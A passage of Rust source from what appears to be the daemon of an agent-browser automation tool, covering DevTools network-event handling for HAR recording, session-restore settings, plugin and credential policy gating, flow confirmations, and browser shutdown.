                                            prev.loading_finished_timestamp = event
                                                .params
                                                .get("timestamp")
                                                .and_then(|v| v.as_f64())
                                                .or(Some(0.0));
                                        }
                                    }
                                    self.har_entries.push(HarEntry {
                                        request_id: request_id.clone(),
                                        wall_time,
                                        method: method.clone(),
                                        url: url.clone(),
                                        request_headers,
                                        post_data,
                                        request_body_size,
                                        resource_type,
                                        status: None,
                                        status_text: String::new(),
                                        http_version: "HTTP/1.1".to_string(),
                                        response_headers: Vec::new(),
                                        mime_type: String::new(),
                                        redirect_url: String::new(),
                                        response_body_size: -1,
                                        cdp_timing: None,
                                        loading_finished_timestamp: None,
                                        response_body: None,
                                        response_body_base64: false,
                                        remote_addr: None,
                                    });
                                    self.flow.tag(&request_id, wall_time);
                                }
                                if self.request_tracking {
                                    if let Some(redirect) = event.params.get("redirectResponse") {
                                        if let Some(prev) = self
                                            .tracked_requests
                                            .iter_mut()
                                            .rev()
                                            .find(|e| e.request_id == request_id)
                                        {
                                            tracked_fill_response(prev, redirect);
                                        }
                                    }
                                    let headers =
                                        request.get("headers").cloned().unwrap_or(json!({}));
                                    let resource_type = event
                                        .params
                                        .get("type")
                                        .and_then(|v| v.as_str())
                                        .unwrap_or("Other")
                                        .to_string();
                                    let timestamp = std::time::SystemTime::now()
                                        .duration_since(std::time::UNIX_EPOCH)
                                        .map(|d| d.as_millis() as u64)
                                        .unwrap_or(0);
                                    self.tracked_requests.push(TrackedRequest {
                                        url,
                                        method,
                                        headers,
                                        timestamp,
                                        resource_type,
                                        request_id,
                                        post_data: request
                                            .get("postData")
                                            .and_then(|v| v.as_str())
                                            .map(String::from),
                                        status: None,
                                        response_headers: None,
                                        mime_type: None,
                                    });
                                }
                            }
                        }
                        "Network.responseReceived"
                            if self.har_recording || self.request_tracking =>
                        {
                            if let Some(response) = event.params.get("response") {
                                let request_id = event
                                    .params
                                    .get("requestId")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("");
                                if self.har_recording {
                                    self.har_progress
                                        .insert(request_id.to_string(), std::time::Instant::now());
                                    if let Some(entry) = self
                                        .har_entries
                                        .iter_mut()
                                        .rev()
                                        .find(|e| e.request_id == request_id)
                                    {
                                        har_fill_response(entry, response);
                                    }
                                }
                                if self.request_tracking {
                                    if let Some(entry) = self
                                        .tracked_requests
                                        .iter_mut()
                                        .rev()
                                        .find(|e| e.request_id == request_id)
                                    {
                                        tracked_fill_response(entry, response);
                                    }
                                }
                            }
                        }
                        "Network.dataReceived" if self.har_recording => {
                            if let Some(id) = event.params.get("requestId").and_then(|v| v.as_str())
                            {
                                self.har_progress
                                    .insert(id.to_string(), std::time::Instant::now());
                            }
                        }
                        "Network.loadingFinished" if self.har_recording => {
                            let request_id = event
                                .params
                                .get("requestId")
                                .and_then(|v| v.as_str())
                                .unwrap_or("");
                            let timestamp = event.params.get("timestamp").and_then(|v| v.as_f64());
                            let encoded_data_length = event
                                .params
                                .get("encodedDataLength")
                                .and_then(|v| v.as_i64());
                            if let Some(entry) = self
                                .har_entries
                                .iter_mut()
                                .rev()
                                .find(|e| e.request_id == request_id)
                            {
                                if let Some(ts) = timestamp {
                                    entry.loading_finished_timestamp = Some(ts);
                                }
                                if let Some(len) = encoded_data_length {
                                    entry.response_body_size = len;
                                }
                                if self.har_content_mode != HarContentMode::None {
                                    har_finished_requests
                                        .push((request_id.to_string(), event.session_id.clone()));
                                }
                            }
                        }
                        "Network.loadingFailed" if self.har_recording => {
                            let request_id = event
                                .params
                                .get("requestId")
                                .and_then(|v| v.as_str())
                                .unwrap_or("");
                            let timestamp = event.params.get("timestamp").and_then(|v| v.as_f64());
                            let error_text = event
                                .params
                                .get("errorText")
                                .and_then(|v| v.as_str())
                                .unwrap_or("Failed");
                            if let Some(entry) = self
                                .har_entries
                                .iter_mut()
                                .rev()
                                .find(|e| e.request_id == request_id)
                            {
                                if entry.status.is_none() {
                                    entry.status = Some(0);
                                    entry.status_text = error_text.to_string();
                                }
                                if let Some(ts) = timestamp {
                                    entry.loading_finished_timestamp = Some(ts);
                                }
                            }
                        }
                        // Frame broadcasting and acks are handled in real-time by the
                        // stream server's background CDP event loop. Here we just
                        // collect acks as a fallback for non-streaming mode.
                        "Page.screencastFrame" if self.stream_server.is_none() => {
                            if let Some(sid) =
                                event.params.get("sessionId").and_then(|v| v.as_i64())
                            {
                                pending_acks.push(sid);
                            }
                        }
                        "Page.javascriptDialogOpening" => {
                            if let Ok(dialog_event) =
                                serde_json::from_value::<JavascriptDialogOpeningEvent>(
                                    event.params.clone(),
                                )
                            {
                                // When auto_dialog is enabled, alert and beforeunload
                                // dialogs are handled by the background dialog_handler_task.
                                // Skip tracking them to avoid a stale warning.
                                let auto_handled = self.auto_dialog
                                    && matches!(
                                        dialog_event.dialog_type.as_str(),
                                        "beforeunload" | "alert"
                                    );
                                if !auto_handled {
                                    self.pending_dialog = Some(PendingDialog {
                                        dialog_type: dialog_event.dialog_type,
                                        message: dialog_event.message,
                                        url: dialog_event.url,
                                        default_prompt: dialog_event.default_prompt,
                                        session_id: event.session_id.clone(),
                                    });
                                }
                            }
                        }
                        "Page.javascriptDialogClosed" => {
                            self.pending_dialog = None;
                        }
                        // Fetch.requestPaused is handled by the background
                        // fetch_handler_task — no need to collect here.
                        _ => {}
                    }
                }
                Err(broadcast::error::TryRecvError::Empty) => break,
                Err(broadcast::error::TryRecvError::Lagged(n)) => {
                    eprintln!("[agent-browser] Warning: CDP event buffer overflowed, {} events dropped. Network requests may be missing from HAR output.", n);
                    continue;
                }
                Err(broadcast::error::TryRecvError::Closed) => {
                    self.event_rx = None;
                    break;
                }
            }
        }

        let attached_page_target_ids: HashSet<&str> = attached_page_sessions
            .iter()
            .map(|(t, _)| t.target_id.as_str())
            .collect();
        if !attached_page_target_ids.is_empty() {
            new_targets
                .retain(|te| !attached_page_target_ids.contains(te.target_info.target_id.as_str()));
        }

        DrainedEvents {
            pending_acks,
            new_targets,
            changed_targets,
            destroyed_targets,
            attached_page_sessions,
            attached_iframe_sessions,
            attached_worker_sessions,
            attached_other_sessions,
            detached_iframe_sessions,
            har_finished_requests,
        }
    }
}

impl Drop for DaemonState {
    fn drop(&mut self) {
        // The background fetch handler sits in rx.recv().await indefinitely.
        // Without aborting it, the tokio runtime won't shut down (tests hang).
        if let Some(task) = self.fetch_handler_task.take() {
            task.abort();
        }
        if let Some(task) = self.dialog_handler_task.take() {
            task.abort();
        }
    }
}

fn append_launch_mutator_policy_actions_for(
    actions: &mut Vec<String>,
    plugins: &[crate::plugins::PluginConfig],
) {
    for plugin in crate::plugins::resolved_plugins_with_capability(
        plugins,
        crate::plugins::CAPABILITY_LAUNCH_MUTATE,
    ) {
        actions.push(crate::plugins::plugin_policy_action(
            &plugin.name,
            crate::plugins::CAPABILITY_LAUNCH_MUTATE,
        ));
    }
}

fn append_browser_provider_policy_action_for(
    actions: &mut Vec<String>,
    provider: &str,
    plugins: &[crate::plugins::PluginConfig],
) {
    if crate::plugins::find_plugin(plugins, provider).is_some_and(|plugin| {
        crate::plugins::plugin_has_capability(plugin, crate::plugins::CAPABILITY_BROWSER_PROVIDER)
    }) {
        actions.push(crate::plugins::plugin_policy_action(
            provider,
            crate::plugins::CAPABILITY_BROWSER_PROVIDER,
        ));
    }
}

fn append_credential_policy_action_for(
    actions: &mut Vec<String>,
    provider: &str,
    plugins: &[crate::plugins::PluginConfig],
) {
    if crate::plugins::find_plugin(plugins, provider).is_some_and(|plugin| {
        crate::plugins::plugin_has_capability(plugin, crate::plugins::CAPABILITY_CREDENTIAL_READ)
    }) {
        actions.push(crate::plugins::plugin_policy_action(
            provider,
            crate::plugins::CAPABILITY_CREDENTIAL_READ,
        ));
    }
}

fn plugins_from_command_or_env(cmd: &Value) -> Vec<crate::plugins::PluginConfig> {
    cmd.get("plugins")
        .and_then(|v| serde_json::from_value::<Vec<crate::plugins::PluginConfig>>(v.clone()).ok())
        .unwrap_or_else(crate::plugins::plugins_from_env)
}

fn reset_restore_runtime_state(state: &mut DaemonState) {
    state.restore_status = "pending".to_string();
    state.restore_status_detail = None;
    state.restore_skipped_origins.clear();
    state.restore_loaded_path = None;
    state.restore_load_failed = false;
    state.restore_validation_pending = false;
    state.restore_save_status = "not_attempted".to_string();
    state.restore_saved_path = None;
}

fn command_restore_check_fields(
    cmd: &Value,
) -> Option<(Option<String>, Option<String>, Option<String>)> {
    let has_check_field = cmd.get("restoreCheckUrl").is_some()
        || cmd.get("restoreCheckText").is_some()
        || cmd.get("restoreCheckFn").is_some();
    if !has_check_field {
        return None;
    }

    Some((
        cmd.get("restoreCheckUrl")
            .and_then(|v| v.as_str())
            .map(ToString::to_string),
        cmd.get("restoreCheckText")
            .and_then(|v| v.as_str())
            .map(ToString::to_string),
        cmd.get("restoreCheckFn")
            .and_then(|v| v.as_str())
            .map(ToString::to_string),
    ))
}

fn restore_checks_are_configured(
    checks: &(Option<String>, Option<String>, Option<String>),
) -> bool {
    checks.0.is_some() || checks.1.is_some() || checks.2.is_some()
}

fn reconcile_restore_check_change(
    state: &mut DaemonState,
    checks: &(Option<String>, Option<String>, Option<String>),
) {
    if restore_checks_are_configured(checks) {
        if matches!(
            state.restore_status.as_str(),
            "loaded" | "loaded_but_invalid"
        ) {
            state.restore_status = "loaded".to_string();
            state.restore_status_detail = None;
            state.restore_load_failed = false;
            state.restore_validation_pending = true;
        }
    } else {
        state.restore_validation_pending = false;
        if state.restore_status == "loaded_but_invalid" {
            state.restore_status = "loaded".to_string();
            state.restore_status_detail = None;
            state.restore_load_failed = false;
        }
    }
}

fn apply_restore_config_from_command(cmd: &Value, state: &mut DaemonState) -> Result<(), String> {
    validate_restore_config_from_command(cmd)?;

    let restore_key = cmd.get("restoreKey").and_then(|v| v.as_str());
    let old_checks = (
        state.restore_check_url.clone(),
        state.restore_check_text.clone(),
        state.restore_check_fn.clone(),
    );

    if let Some(restore_key) = restore_key {
        if !restore_key.is_empty() {
            if state.session_name.as_deref() != Some(restore_key) {
                reset_restore_runtime_state(state);
            }
            state.session_name = Some(restore_key.to_string());
            if state.restore_status == "not_configured" {
                state.restore_status = "pending".to_string();
            }
        }
    }
    if let Some(policy) = cmd.get("restoreSave").map(|v| v.as_str().unwrap_or("auto")) {
        state.restore_save = policy.to_string();
    }
    if let Some(new_checks) = command_restore_check_fields(cmd) {
        state.restore_check_url = new_checks.0.clone();
        state.restore_check_text = new_checks.1.clone();
        state.restore_check_fn = new_checks.2.clone();
        if old_checks != new_checks {
            reconcile_restore_check_change(state, &new_checks);
        }
    }

    Ok(())
}

fn validate_restore_config_from_command(cmd: &Value) -> Result<(), String> {
    let restore_key = cmd.get("restoreKey").and_then(|v| v.as_str());
    if let Some(restore_key) = restore_key {
        if !restore_key.is_empty() && !is_valid_session_name(restore_key) {
            return Err(session_name_error(restore_key));
        }
    }

    let restore_save = cmd.get("restoreSave").map(|v| v.as_str().unwrap_or("auto"));
    if let Some(policy) = restore_save {
        if !matches!(policy, "auto" | "always" | "never") {
            return Err(format!(
                "Invalid restore save policy '{}'. Use auto, always, or never.",
                policy
            ));
        }
    }

    Ok(())
}

fn command_changes_restore_key(cmd: &Value, state: &DaemonState) -> bool {
    cmd.get("restoreKey")
        .and_then(|v| v.as_str())
        .filter(|key| !key.is_empty())
        .is_some_and(|key| state.session_name.as_deref() != Some(key))
}

/// Whether the session holds a browser of any backend: CDP, a provider
/// session, or a WebDriver session (Safari, iOS).
fn has_active_browser_session(state: &DaemonState) -> bool {
    state.browser.is_some()
        || state.active_provider_session.is_some()
        || state.webdriver_backend.is_some()
        || state.appium.is_some()
        || state.safari_driver.is_some()
}

async fn close_before_implicit_relaunch(state: &mut DaemonState) -> Result<(), String> {
    let browser_use = state
        .active_provider_session
        .as_ref()
        .is_some_and(|active| provider_is_browser_use(&active.session.provider));
    let result = close_all_browser_backends(state).await;
    if browser_use {
        result
    } else {
        Ok(())
    }
}

async fn apply_restore_config_after_confirmation(
    cmd: &Value,
    state: &mut DaemonState,
) -> Result<bool, String> {
    let restore_key_changed = command_changes_restore_key(cmd, state);
    let had_browser = has_active_browser_session(state);

    if restore_key_changed && had_browser {
        let _ = auto_save_restore_state(state).await;
        close_before_implicit_relaunch(state).await?;
    }

    apply_restore_config_from_command(cmd, state)?;
    Ok(restore_key_changed && had_browser)
}

const BROWSER_USE_ATTACH_DEADLINE: std::time::Duration = std::time::Duration::from_secs(8);

fn provider_is_browser_use(provider: &str) -> bool {
    matches!(
        provider.to_lowercase().as_str(),
        "browser-use" | "browseruse"
    )
}

async fn attach_provider_cdp(
    provider: &str,
    conn: &providers::ProviderConnection,
    ws_headers: Option<Vec<(String, String)>>,
    state: &mut DaemonState,
    plugins: &[crate::plugins::PluginConfig],
) -> Result<BrowserManager, String> {
    remember_active_provider_session(state, conn.session.clone(), plugins);
    if provider_is_browser_use(provider)
        && !url::Url::parse(&conn.ws_url).is_ok_and(|url| {
            matches!(url.scheme(), "ws" | "wss" | "http" | "https") && url.host_str().is_some()
        })
    {
        return Err("Browser Use did not return a usable cdpUrl".to_string());
    }
    let attach = async {
        if conn.direct_page {
            BrowserManager::connect_cdp_direct(&conn.ws_url).await
        } else if ws_headers.is_some() {
            BrowserManager::connect_cdp_with_headers(&conn.ws_url, ws_headers).await
        } else {
            BrowserManager::connect_cdp(&conn.ws_url).await
        }
    };
    if provider_is_browser_use(provider) {
        match tokio::time::timeout(BROWSER_USE_ATTACH_DEADLINE, attach).await {
            Ok(result) => result.map_err(|_| "Browser Use CDP attachment failed".to_string()),
            Err(_) => Err(format!(
                "Browser Use CDP attachment timed out after {}s",
                BROWSER_USE_ATTACH_DEADLINE.as_secs()
            )),
        }
    } else {
        attach.await
    }
}

fn combine_provider_failure(context: String, cleanup_error: Option<String>) -> String {
    match cleanup_error {
        Some(cleanup_error) => format!(
            "{} (provider cleanup also failed: {})",
            context, cleanup_error
        ),
        None => context,
    }
}

fn remember_active_provider_session(
    state: &mut DaemonState,
    session: Option<providers::ProviderSession>,
    plugins: &[crate::plugins::PluginConfig],
) {
    state.active_provider_connection = true;
    state.active_provider_session = session.map(|session| ActiveProviderSession {
        session,
        plugins: plugins.to_vec(),
    });
}

async fn close_active_provider_session(state: &mut DaemonState) -> Result<(), String> {
    if let Some(active) = state.active_provider_session.as_ref() {
        providers::close_provider_session_with_plugins(&active.session, &active.plugins).await?;
    }
    state.active_provider_session = None;
    state.active_provider_connection = false;
    Ok(())
}

pub(crate) async fn close_current_browser(state: &mut DaemonState) -> Result<(), String> {
    let browser = state.browser.take();
    state.launch_identity = None;
    state.webmcp_enabled = false;
    state.network_auto_attach_installed = false;
    state.iframe_sessions.clear();
    state.active_iframe_sessions.clear();
    state.webmcp.clear_all();
    state.screencasting = false;
    state.reset_input_state();
    state.update_stream_client().await;

    let close_error = if let Some(mut mgr) = browser {
        mgr.close().await.err()
    } else {
        None
    };

    let provider_close_error = close_active_provider_session(state).await.err();
    let close_error = match (close_error, provider_close_error) {
        (Some(browser_error), Some(provider_error)) => Some(format!(
            "{} (also failed to release provider browser: {})",
            browser_error, provider_error
        )),
        (error, None) | (None, error) => error,
    };
    if let Some(err) = close_error {
        return Err(err);
    }
    Ok(())
}

/// Close every browser backend owned by the daemon.
///
/// Lifecycle shutdown paths use this instead of `close_current_browser`
/// because Safari and iOS sessions live outside `state.browser`.
pub(crate) async fn close_all_browser_backends(state: &mut DaemonState) -> Result<(), String> {
    let close_result = close_current_browser(state).await;

    if let Some(ref mut webdriver) = state.webdriver_backend {
        let _ = tokio::time::timeout(std::time::Duration::from_secs(3), webdriver.close()).await;
    }
    state.webdriver_backend = None;
    if let Some(ref mut appium) = state.appium {
        let _ = tokio::time::timeout(std::time::Duration::from_secs(3), appium.close()).await;
    }
    state.appium = None;
    if let Some(ref mut driver) = state.safari_driver {
        driver.kill();
    }
    state.safari_driver = None;
    state.backend_type = BackendType::Cdp;

    close_result
}

async fn close_after_network_control_failure(
    state: &mut DaemonState,
    error: String,
) -> Result<(), String> {
    let close_error = close_current_browser(state).await.err();
    Err(match close_error {
        Some(close_error) => format!(
            "Failed to install browser network controls: {} (also failed to close browser: {})",
            error, close_error
        ),
        None => format!("Failed to install browser network controls: {}", error),
    })
}

/// Returns whether an action can run without implicitly launching a browser.
/// `auth login --no-navigate` must never launch a browser or manufacture an
/// about:blank page to satisfy the command.
fn is_auth_login_no_navigate(cmd: &Value) -> bool {
    cmd.get("action").and_then(Value::as_str) == Some("auth_login")
        && cmd
            .get("noNavigate")
            .and_then(Value::as_bool)
            .unwrap_or(false)
}

/// Whether `cmd` may launch or relaunch the session's browser. Commands that
/// cannot apply only the live settings, so launch settings and a forced
/// relaunch wait for the next command that can.
pub(crate) fn command_launches_browser(cmd: &Value) -> bool {
    let action = cmd.get("action").and_then(Value::as_str).unwrap_or("");
    (!skip_launch_action(action) || action == "launch") && !is_auth_login_no_navigate(cmd)
}

fn skip_launch_action(action: &str) -> bool {
    if action == INTERNAL_DAEMON_SHUTDOWN_ACTION {
        return true;
    }

    matches!(
        action,
        "" | "launch"
            | "close"
            | "read"
            | "har_stop"
            | "flow_save"
            | "flow_steps"
            | "flow_run"
            | "flow_list"
            | "credentials_set"
            | "credentials_get"
            | "credentials_delete"
            | "credentials_list"
            | "auth_save"
            | "auth_show"
            | "auth_delete"
            | "auth_list"
            | "confirm"
            | "deny"
            | "state_list"
            | "state_show"
            | "state_clear"
            | "state_clean"
            | "state_rename"
            | "device_list"
            | "stream_enable"
            | "stream_disable"
            | "stream_status"
            | "session_info"
            | "cdp_url"
            | "webmcp_result"
            | "webmcp_cancel"
    )
}

fn should_validate_restore_after_action(action: &str) -> bool {
    action != "launch"
}

/// A flow run that stopped on a site condition reports it as the failure's data.
#[inline(never)]
fn attach_flow_stop(resp: &mut Value, state: &mut DaemonState) {
    if let Some(stop) = state.flow_stop.take() {
        if resp.get("success") != Some(&json!(true)) {
            resp["code"] = stop["status"].clone();
            resp["data"] = stop;
        }
    }
}

/// Parks a `flow_run` whose writes the policy does not cover, for confirmation.
#[inline(never)]
fn park_unconfirmed_flow_write(
    id: &str,
    cmd: &Value,
    action: &str,
    run_flow: Option<&super::flow::Flow>,
    state: &mut DaemonState,
) -> Option<Value> {
    if action != "flow_run" {
        return None;
    }
    let flow = run_flow?;
    let policy_action = unconfirmed_flow_write(cmd, flow, state)?;
    state.pending_confirmation = Some(PendingConfirmation {
        action: policy_action.clone(),
        cmd: cmd.clone(),
        approved_actions: state.confirmed_policy_actions.iter().cloned().collect(),
        flow: Some(Box::new(flow.clone())),
    });
    Some(json!({
        "id": id,
        "success": true,
        "data": {
            "confirmation_required": true,
            "confirmation_id": id,
            "action": policy_action,
        },
    }))
}

/// Boxed here, inside the callee, so the large flow futures never sit in the
/// stack frame of `execute_command`.
fn handle_flow_command<'a>(
    action: &'a str,
    cmd: &'a Value,
    state: &'a mut DaemonState,
    run_flow: Option<Box<super::flow::Flow>>,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<Value, String>> + Send + 'a>> {
    Box::pin(async move { run_flow_command(action, cmd, state, run_flow).await })
}

async fn run_flow_command(
    action: &str,
    cmd: &Value,
    state: &mut DaemonState,
    run_flow: Option<Box<super::flow::Flow>>,
) -> Result<Value, String> {
    match action {
        "flow_steps" => handle_flow_steps(cmd, state),
        "flow_save" => handle_flow_save(cmd, state).await,
        "flow_run" => match run_flow {
            Some(flow) => handle_flow_run(cmd, state, *flow).await,
            None => Err("flow run requires a name".to_string()),
        },
        _ => handle_flow_list(cmd),
    }
}

fn begin_flow_step<'a>(
    action: &'a str,
    cmd: &'a Value,
    state: &'a mut DaemonState,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send + 'a>> {
    Box::pin(record_flow_step(action, cmd, state))
}

async fn record_flow_step(action: &str, cmd: &Value, state: &mut DaemonState) {
    if state.flow.wants_context(action) {
        let from_url = match state.browser.as_ref() {
            Some(mgr) => mgr.get_url().await.ok(),
            None => None,
        };
        let traits = flow_field_traits(action, cmd, state).await;
        state
            .flow
            .begin(action, cmd, &state.ref_map, from_url, traits.as_ref());
    } else {
        state.flow.begin(action, cmd, &state.ref_map, None, None);
    }
}

/// The flow a `flow_run` command runs: the one a confirmation parked, or the
/// named file.
#[inline(never)]
fn load_run_flow(
    cmd: &Value,
    action: &str,
    state: &mut DaemonState,
) -> Result<Option<Box<super::flow::Flow>>, String> {
    if action != "flow_run" {
        return Ok(None);
    }
    if let Some(flow) = state.preloaded_flow.take() {
        return Ok(Some(flow));
    }
    let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
        return Err("flow run requires a name".to_string());
    };
    super::flow::load_flow(name, cmd.get("origin").and_then(|v| v.as_str()))
        .map(|flow| Some(Box::new(flow)))
}

fn policy_actions_for_command(
    cmd: &Value,
    action: &str,
    needs_implicit_launch: bool,
    attached: Option<&AttachedTarget>,
    flow: Option<&super::flow::Flow>,
    settings: &Running,
) -> Vec<String> {
    let mut actions = vec![action.to_string()];
    // `a11y <url>` performs a real browser navigation before the audit. Keep
    // navigation deny and confirmation policies effective for the compound
    // command instead of treating it as a read-only audit.
    if action == "a11y" && cmd.get("url").and_then(|v| v.as_str()).is_some() {
        actions.push("navigate".to_string());
    }
    if let Some(flow) = flow.filter(|_| action == "flow_run") {
        actions.extend(flow.run_writes().iter().map(|w| w.action()));
    }
    if action == "auth_login" {
        if let Some(provider) = cmd.get("credentialProvider").and_then(|v| v.as_str()) {
            let plugins = plugins_from_command_or_env(cmd);
            append_credential_policy_action_for(&mut actions, provider, &plugins);
        }
    }
    if action == "launch" {
        let plugins = plugins_from_command_or_env(cmd);
        // A target the envelope names wins, then the external target the
        // settings name, then the browser the session is attached to.
        let mut launch = cmd.clone();
        if AttachedTarget::named_by(cmd).is_none() {
            if let Some((field, value)) = settings_launch_target(settings) {
                if let Some(obj) = launch.as_object_mut() {
                    obj.insert(field.to_string(), value);
                }
            } else if let Some(resolved) = resolve_launch_target(cmd, attached) {
                launch = resolved;
            }
        }
        append_launch_policy_actions(&mut actions, &launch, &plugins);
    } else if !skip_launch_action(action) && needs_implicit_launch {
        let plugins = plugins_from_command_or_env(cmd);
        if let Some((field, value)) = settings_launch_target(settings) {
            append_launch_policy_actions(&mut actions, &json!({ field: value }), &plugins);
            return actions;
        }
        if let Some(launch) = resolve_launch_target(&json!({ "action": "launch" }), attached) {
            append_launch_policy_actions(&mut actions, &launch, &plugins);
            return actions;
        }
        let provider_launch = settings
            .provider()
            .map(|provider| provider.to_lowercase())
            .filter(|provider| !provider.is_empty() && provider != "ios" && provider != "safari");
        if let Some(provider) = provider_launch {
            append_browser_provider_policy_action_for(&mut actions, &provider, &plugins);
        } else {
            append_launch_mutator_policy_actions_for(&mut actions, &plugins);
        }
    }
    actions
}

/// The external browser the session's settings connect to, as the launch field
/// that names it. Local sessions and the WebDriver providers name none.
fn settings_launch_target(settings: &Running) -> Option<(&'static str, Value)> {
    match settings.connection() {
        Connection::Provider(provider)
            if !matches!(provider.to_lowercase().as_str(), "" | "ios" | "safari") =>
        {
            Some(("provider", json!(provider.to_lowercase())))
        }
        Connection::Cdp(cdp) => Some(("cdpUrl", json!(cdp))),
        Connection::AutoConnect => Some(("autoConnect", json!(true))),
        _ => None,
    }
}

fn append_launch_policy_actions(
    actions: &mut Vec<String>,
    launch: &Value,
    plugins: &[crate::plugins::PluginConfig],
) {
    // The same rule execution uses for what a launch connects to.
    match AttachedTarget::named_by(launch) {
        Some(AttachedTarget::Provider(provider)) => {
            append_browser_provider_policy_action_for(actions, &provider, plugins);
        }
        Some(_) => {}
        None => append_launch_mutator_policy_actions_for(actions, plugins),
    }
}

/// The command future is large; boxing it keeps it off the caller's stack,
/// which a debug-build test thread would otherwise overflow.
pub async fn execute_command(cmd: &Value, state: &mut DaemonState) -> Value {
    Box::pin(execute_command_flow(cmd, state)).await
}

async fn execute_command_flow(cmd: &Value, state: &mut DaemonState) -> Value {
    let outer = state.flow.enter();
    let mut resp = execute_command_inner(cmd, state).await;
    if let Some(seq) = state.flow.exit(outer) {
        let ok = resp.get("success") == Some(&json!(true));
        let url = match state.browser.as_ref() {
            Some(mgr) => mgr.get_url().await.ok(),
            None => None,
        };
        let (wants_value, wants_traits) = state.flow.after_reads(seq);
        let value = if wants_value {
            flow_active_field_value(state).await
        } else {
            None
        };
        let traits = if wants_traits {
            flow_active_field_traits(state).await
        } else {
            None
        };
        state.flow.end(seq, ok, url, value, traits);
        resp["recorded"] = json!({ "seq": seq });
    }
    let action = cmd.get("action").and_then(|v| v.as_str()).unwrap_or("");
    if !skip_launch_action(action) {
        warn_if_browser_outdated(state, &mut resp).await;
    }
    resp
}

/// Adds a warning to the response when the connected browser is outdated with known CVEs. Checks each browser product once and never fails.
async fn warn_if_browser_outdated(state: &mut DaemonState, response: &mut Value) {
    let disabled =
        env::var("AGENT_BROWSER_NO_VERSION_CHECK").is_ok_and(|v| v == "1" || v == "true");
    if state.active_provider_connection || disabled {
        return;
    }
    let Some(mgr) = state.browser.as_mut() else {
        return;
    };
    if mgr.product_checked() {
        return;
    }
    let Ok(Ok(version)) = tokio::time::timeout(
        std::time::Duration::from_secs(3),
        mgr.client
            .send_command_no_params("Browser.getVersion", None),
    )
    .await
    else {
        return;
    };
    mgr.mark_product_checked();
    let Some(product) = version.get("product").and_then(|v| v.as_str()) else {
        return;
    };
    if state.browser_security_checked.as_deref() == Some(product) {
        return;
    }
    state.browser_security_checked = Some(product.to_string());
    if let Some(w) = crate::browser_security::outdated_warning(product).await {
        append_warning(response, &w);
    }
}

async fn execute_command_inner(cmd: &Value, state: &mut DaemonState) -> Value {
    let action = cmd.get("action").and_then(|v| v.as_str()).unwrap_or("");
    // Unlike normal auth login, no-navigation mode must never launch a
    // browser or manufacture an about:blank page to satisfy the command.
    let auth_login_no_navigate = is_auth_login_no_navigate(cmd);
    if let Some(mode @ ("instant" | "smooth" | "human")) =
        cmd.get("defaultInputMode").and_then(Value::as_str)
    {
        // Only an explicit session setting persists. inputMode is an override
        // for this command, including --human and MCP's human argument.
        state.input_mode = mode.to_string();
    }
    let id = cmd
        .get("id")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();

    let cmd_start = std::time::Instant::now();

    // A retry of the request that wedged the tab must not run on its blank
    // replacement: `url` would report about:blank as a success.
    if let Some((_, report)) = state
        .undelivered_wedge
        .as_ref()
        .filter(|(wedged_id, _)| *wedged_id == id)
    {
        let mut resp = error_response(&id, &report.error_message());
        resp["data"] = report.data();
        return resp;
    }

    if let Err(err) = validate_restore_config_from_command(cmd) {
        return error_response(&id, &err);
    }

    // Invalid inputs are rejected before expensive setup: an unsupported
    // `find` action must fail here, not after a browser launch and a locator
    // resolution that can mask it with "element not found".
    if let Err(err) = validate_find_subaction(action, cmd) {
        return error_response(&id, &err);
    }

    if action == INTERNAL_DAEMON_SHUTDOWN_ACTION {
        let mut resp = match close_session(state, false).await {
            Ok(data) => success_response(&id, data),
            Err(e) => error_response(&id, &super::browser::to_ai_friendly_error(&e)),
        };
        inject_lifecycle(&mut resp, state, false, false, false);
        return resp;
    }

    if let Some(ref server) = state.stream_server {
        let mut broadcast_cmd;
        let has_internal_fields = cmd.get("plugins").is_some()
            || cmd.get("settings").is_some()
            || cmd.get("pinTab").is_some()
            || cmd.get("restoreKey").is_some()
            || cmd.get("restoreSave").is_some()
            || cmd.get("restoreCheckUrl").is_some()
            || cmd.get("restoreCheckText").is_some()
            || cmd.get("restoreCheckFn").is_some();
        let cmd_for_broadcast = if has_internal_fields {
            broadcast_cmd = cmd.clone();
            if let Some(obj) = broadcast_cmd.as_object_mut() {
                obj.remove("plugins");
                obj.remove("settings");
                obj.remove("pinTab");
                obj.remove("restoreKey");
                obj.remove("restoreSave");
                obj.remove("restoreCheckUrl");
                obj.remove("restoreCheckText");
                obj.remove("restoreCheckFn");
            }
            &broadcast_cmd
        } else {
            cmd
        };
        server.broadcast_command(action, &id, cmd_for_broadcast);
    }

    // Drain and apply pending CDP events (console, errors, screencast frames, target lifecycle)
    if let Err(e) = state.drain_cdp_events_background().await {
        return error_response(&id, &super::browser::to_ai_friendly_error(&e));
    }

    // After the drain, so late requests from the previous command keep its tag.
    begin_flow_step(action, cmd, state).await;

    // Keep element resolution in sync with the `frame` selection (see
    // element::set_active_frame for why this is mirrored).
    super::element::set_active_frame(state.active_frame_id.as_deref());

    // `--pin-tab` from the client enables strict tab binding even when the
    // daemon was started without the flag, and `--no-pin-tab` (pinTab: false)
    // disables a sticky pin restored from disk or enabled earlier. Both are
    // persisted with the binding so the setting survives daemon restarts;
    // absence of the field leaves the current state untouched.
    match cmd.get("pinTab").and_then(|v| v.as_bool()) {
        Some(pin) if pin != state.pin_tab => {
            // Persist the pinned state before committing it to live state, so a
            // load/save failure leaves the daemon exactly as it was instead of
            // reporting an error while the isolation mode already flipped.
            match tab_binding::load(&state.session_id) {
                Ok(Some(mut binding)) => {
                    if binding.pinned != pin {
                        binding.pinned = pin;
                        if let Err(e) = tab_binding::save(&state.session_id, &binding) {
                            return error_response(
                                &id,
                                &format!(
                                    "cannot persist the pin-tab setting: {} — the change was \
                                     not applied",
                                    e
                                ),
                            );
                        }
                    }
                }
                Ok(None) => {}
                Err(e) => {
                    return error_response(
                        &id,
                        &format!(
                            "cannot read the session tab binding to update the pin state: {} \
                             — delete the binding file to reset the session",
                            e
                        ),
                    );
                }
            }
            // Persistence succeeded (or there was nothing to write): commit the
            // live state, and force a re-persist from the snapshot next time.
            state.pin_tab = pin;
            if let Some(ref mut mgr) = state.browser {
                mgr.set_pin_tab(pin);
            }
            state.last_persisted_binding = None;
        }
        _ => {}
    }

    // The settings this invocation set ride on the command. Live settings
    // apply now, before the policy checks, so a changed policy governs this
